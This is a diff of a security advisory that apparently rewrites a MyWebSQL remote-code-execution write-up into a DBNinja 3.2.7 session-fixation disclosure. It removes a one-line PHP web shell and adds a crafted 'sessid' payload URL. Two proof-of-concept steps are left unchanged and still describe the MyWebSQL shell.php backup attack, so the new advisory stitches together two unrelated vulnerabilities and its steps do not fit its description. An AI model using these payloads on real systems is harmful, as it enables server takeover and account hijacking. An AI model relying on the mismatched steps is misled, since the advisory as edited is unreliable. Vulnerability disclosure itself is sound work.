@@ -5,23 +5,23 @@
 ### Testing Target
 - Product: DBNinja
 - Version: 3.2.7
-- Official Website: http://mywebsql.net/
-- Github: https://github.com/Samnan/MyWebSQL
+- Official Website: https://www.dbninja.com/
+- Github: N/A
 
 ### Summary
-MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability.
+DBNinja ver 3.2.7 exist broken authentication vulnerability.
 
 ### Description
-MyWebSQL version in 3.7 has remote code execution (RCE) vulnerability after write a shell code in database and execute `Backup Database` function.
+The attacker designed a URL with a specific `sessid`, if the victim browsed the URL and then logged into NinjaDB. The attacker can login to NinjaDB as the victim by using this `sessid`.
  
 ### Concept
-1. Create a test table (code) and write a shell code in this table.  
- **Shell code example**: `<?php system($_GET[cmd]); ?>`
+1. Design a URL with a specific “sessid”, and the victim browsed the URL.  
+ **Payload**: `http://127.0.0.1/dbninja/data.php?sessid=exploittest&action=ver`
 ![](./png/1.png)
 2. Execute `Backup Database` function and modify Backup filename as `shell.php`.
 ![](./png/2.png)
 3. Browse `(domain)/mywebsql/backups/shell.php?cmd=XXX`. Here instance is  `cmd=ipconfig` as below figure.
 ![](./png/3.png)
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTMxMTcwNjE0Nl19
+eyJoaXN0b3J5IjpbLTE0MDYxMjkxMzFdfQ==
 -->
